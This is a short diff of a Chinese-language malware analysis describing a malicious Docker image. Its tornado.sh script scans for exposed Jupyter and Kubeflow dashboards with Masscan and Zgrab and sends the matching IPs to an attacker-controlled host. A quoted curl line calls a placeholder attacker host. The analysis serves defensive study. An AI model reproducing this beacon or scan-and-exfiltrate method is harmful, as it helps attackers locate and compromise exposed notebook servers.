@@ -14,7 +14,7 @@ curl -Lk https://IP地址//SATW/ip.php -o /dev/null
 
 ```
 
-此Docker镜像中还包含一个tornado.sh脚本，该脚本通过Masscan和Zgarb工具侦察目标IP地址范围和提供的端口，如果匹配到"Home Page - Select or create a notebook"、"Kubeflow Central Dashboard"、"Jupyter Lab"、"JupyterLab"关键字则会通过jq过滤掉其匹配的IP地址信息（如代码清单1.51所示），然后发送到可控主机上.
+此Docker镜像中还包含一个tornado.sh脚本，该脚本通过Masscan和Zgarb工具侦察目标IP地址范围和提供的端口，如果匹配到"Home Page - Select or create a notebook"、"Kubeflow Central Dashboard"、"Jupyter Lab"、"JupyterLab"关键字则会通过jq过滤掉其匹配的IP地址信息，然后发送到可控主机上.
 
 ```bash
 rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
